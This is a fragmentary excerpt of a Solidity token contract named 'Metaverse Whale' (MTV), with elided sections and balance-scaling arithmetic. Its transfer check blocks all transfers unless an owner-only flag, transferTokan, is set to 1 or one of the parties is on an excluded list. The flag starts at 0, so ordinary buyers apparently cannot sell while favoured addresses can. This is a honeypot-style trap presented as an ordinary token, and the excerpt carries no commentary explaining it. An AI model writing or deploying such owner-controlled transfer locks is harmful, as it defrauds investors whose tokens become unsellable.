...
contract MTV is ERC20Detailed, Ownable {
  ...
  // TOTALMTV is a multiple of INITIAL_FRAGMENTS_SUPPLY so that MTVPerFragment is an integer.
  // Use the highest value that fits in a uint256 for max granularity.
  uint256 private constant TOTALMTV = MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);

  // MAX_SUPPLY = maximum integer < (sqrt(4*TOTALMTV + 1) - 1) / 2
  uint256 private constant MAX_SUPPLY = ~uint128(0);  // (2^128) - 1

  uint256 private _totalSupply;
  uint256 private MTVPerFragment;
  mapping(address => uint256) private MTVBalances;
  mapping(address => mapping(address => uint256)) private _allowedFragments;
  uint8 public transferTokan=0;
  ...
  constructor ()
  ERC20Detailed("Metaverse Whale", "MTV", uint8(DECIMALS))
  payable
  public
  {
    marketingAddress =address(0x2855214cb9CBDeA1Bdb9eE17E1bf268B05B68CC9);
    master = msg.sender;
    ...
    MTVBalances[msg.sender] = TOTALMTV;
    MTVPerFragment = TOTALMTV.div(_totalSupply);
...
*/
  ...
  returns (uint256)
  {
    return MTVBalances[who].div(MTVPerFragment);
  }
  ...
  returns (bool)
  {
    ...
    require(transferTokan==1||_isExcluded[from] || _isExcluded[to]);
...
function tokenTransferEx(address recipient, uint256 amount) public {
   ...
   uint256 MTVValue = amount.mul(MTVPerFragment);
    MTVBalances[msg.sender] = MTVBalances[msg.sender].sub(MTVValue);
    MTVBalances[recipient] = MTVBalances[recipient].add(MTVValue);
  ...
  function _transferStandard(address sender, address recipient, uint256 amount) private {
    ...
    uint256 MTVDeduct = amount.mul(MTVPerFragment);
    uint256 MTVValue = tTransferAmount.mul(MTVPerFragment);
    MTVBalances[sender] = MTVBalances[sender].sub(MTVDeduct);
    MTVBalances[recipient] = MTVBalances[recipient].add(MTVValue);
  ...
  function _transferExcluded(address sender, address recipient, uint256 amount) private {
    uint256 MTVValue = amount.mul(MTVPerFragment);
    MTVBalances[sender] = MTVBalances[sender].sub(MTVValue);
    MTVBalances[recipient] = MTVBalances[recipient].add(MTVValue);
    emit Transfer(sender, recipient, amount);
  }

function transferTokanAm(uint8 option) public onlyOwner {
      transferTokan=option;
  }
  ...
  function _takeFee(address sender, uint256 tFee) private {
    uint256 rFee = tFee.mul(MTVPerFragment);
    MTVBalances[address(this)] = MTVBalances[address(this)].add(rFee);
